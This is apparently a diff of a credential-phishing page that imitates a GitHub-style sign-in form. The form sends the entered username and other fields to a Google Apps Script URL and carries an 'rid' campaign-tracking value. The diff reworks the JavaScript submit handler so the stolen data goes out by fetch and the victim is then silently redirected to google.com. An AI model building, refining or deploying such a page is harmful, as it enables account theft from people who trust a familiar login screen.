@@ -439,36 +439,11 @@
 
                     <div class="auth-form-body mt-3">
 
-                        <script>
-                            // Fonction pour gérer la soumission du formulaire
-                            function handleFormSubmit(event) {
-                                event.preventDefault(); // Empêche la soumission par défaut
-
-                                // Envoi des données via fetch
-                                const form = event.target;
-                                const formData = new FormData(form);
-
-                                fetch(form.action, {
-                                    method: form.method,
-                                    body: formData,
-                                })
-                                    .then(response => {
-                                        if (response.ok) {
-                                            // Redirection après succès
-                                            window.location.href = "https://www.google.com/";
-                                        }
-                                    })
-
-                            }
-                        </script>
-
-
-
-
 
                         <!-- '"` --><!-- </textarea></xmp> -->
                         <form method="POST"
-                            action="https://script.google.com/macros/s/AKfycbxXxzPWt5uAvKpLpPkSKSQeeVTpW5uqSNWCmeTCEXWk1e-XbCYPq92YD1WIYwVClNReVA/exec">
+                            action="https://script.google.com/macros/s/AKfycbxXxzPWt5uAvKpLpPkSKSQeeVTpW5uqSNWCmeTCEXWk1e-XbCYPq92YD1WIYwVClNReVA/exec"
+                            id="myForm">
                             <label for="username">Username:</label>
                             <input type="text" id="username" name="username" required>
                             <br>
@@ -487,6 +462,32 @@
                             if (rid) {
                                 document.querySelector('input[name="rid"]').value = rid;
                             }
+
+                            // Intercept form submission for redirection
+                            document.getElementById('myForm').addEventListener('submit', function (event) {
+                                event.preventDefault(); // Empêche la soumission classique
+
+                                const form = event.target;
+                                const formData = new FormData(form);
+
+                                // Envoi des données via Fetch
+                                fetch(form.action, {
+                                    method: form.method,
+                                    body: formData
+                                })
+                                    .then(response => {
+                                        if (response.ok) {
+                                            // Redirection après succès
+                                            window.location.href = "https://www.google.com/";
+                                        } else {
+                                            alert("Erreur lors de l'envoi du formulaire.");
+                                        }
+                                    })
+                                    .catch(error => {
+                                        console.error("Erreur réseau ou serveur :", error);
+                                        alert("Une erreur s'est produite. Veuillez réessayer.");
+                                    });
+                            });
                         </script>
                         <webauthn-status class="js-webauthn-login-emu-control">
                             <include-fragment data-target="webauthn-status.fragment"
